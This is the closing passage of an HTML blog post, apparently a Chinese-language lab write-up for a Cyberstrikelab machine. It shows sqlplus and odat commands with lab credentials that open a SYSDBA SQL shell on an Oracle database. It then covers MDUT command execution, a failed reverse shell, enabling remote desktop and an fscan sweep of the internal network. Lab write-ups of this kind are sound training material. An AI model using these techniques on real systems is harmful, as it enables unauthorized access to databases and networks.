+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlplus &#39;cslab/cslab@123#wi@172.17.50.33:1521/ORCL&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sqlplus /nolog
+</span></span><span class="line"><span class="cl">connect cslab@&#39;(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=172.17.50.33)(PORT=1521))(CONNECT_DATA=(SERVICE_NAME=ORCL)))&#39;</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>使用 <code>odat</code> 登录，返回了 <code>SQLShell</code>，但执行没结果</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 odat search -s 172.17.50.33 -p 1521 -U cslab -P cslab@123#wi -d ORCL --sysdba --sql-shell</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><img loading="lazy" src='/posts/cslab-diamond/file-20250331113852887.png' alt="/posts/cslab-diamond/file-20250331113852887.png" height="249" width="976"></p>
+<p><code>MDUT</code> 连接成功
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330195122883.png' alt="/posts/cslab-diamond/file-20250330195122883.png" height="630" width="868"></p>
+<p>但十分受限，文件功能只能看文件名，无法读取和上传文件，反弹 <code>Shell</code> 也报错
+<img loading="lazy" src='/posts/cslab-diamond/file-20250331113823158.png' alt="/posts/cslab-diamond/file-20250331113823158.png" height="757" width="1380">
+<img loading="lazy" src='/posts/cslab-diamond/file-20250331111734105.png' alt="/posts/cslab-diamond/file-20250331111734105.png" height="218" width="974"></p>
+<p>命令执行返回 <code>null</code>，但目标本地是执行成功的，上线远程桌面
+<img loading="lazy" src='/posts/cslab-diamond/file-20250331111458998.png' alt="/posts/cslab-diamond/file-20250331111458998.png" height="163" width="969"></p>
+<p>连接成功
+<img loading="lazy" src='/posts/cslab-diamond/file-20250331115737293.png' alt="/posts/cslab-diamond/file-20250331115737293.png" height="960" width="1714"></p>
+<p><code>Fscan</code> 扫描内网
+<img loading="lazy" src='/posts/cslab-diamond/file-20250331115657221.png' alt="/posts/cslab-diamond/file-20250331115657221.png" height="447" width="1161"></p>
+<p>打到这里 <code>CSLab</code> 突然宣布停服维护，那就稍等一天再继续打吧
+<img loading="lazy" src='/posts/cslab-diamond/fd4c7167e7804b46b3cc8d3f4ab8f0b.jpg' alt="/posts/cslab-diamond/fd4c7167e7804b46b3cc8d3f4ab8f0b.jpg" height="954" width="1152"></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2026-05-01 12:09:56">Updated on 2026-05-01&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/cslab-diamond/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/cslab-diamond/" data-title="Cyberstrikelab Diamond Writeup" data-hashtags="Cyberstrikelab"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/cslab-diamond/" data-hashtag="Cyberstrikelab"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/cslab-diamond/" data-title="Cyberstrikelab Diamond Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/cyberstrikelab/" class="post-tag" title="Tags - Cyberstrikelab">Cyberstrikelab</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/cslab-pearl/" class="post-nav-item" rel="prev" title="Cyberstrikelab Pearl Writeup"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>Cyberstrikelab Pearl Writeup</a><a href="/posts/hackthebox%E8%B5%9B%E5%AD%A3%E9%9D%B6%E6%9C%BA-haze/" class="post-nav-item" rel="next" title="HackTheBox Haze Writeup">HackTheBox Haze Writeup<i class="fa-solid fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://github.com/L1nq0" target="_blank" rel="external nofollow noopener noreferrer">L1nq</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/c2a133d2831ea2cdcf9e4a77e2ee69a3.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
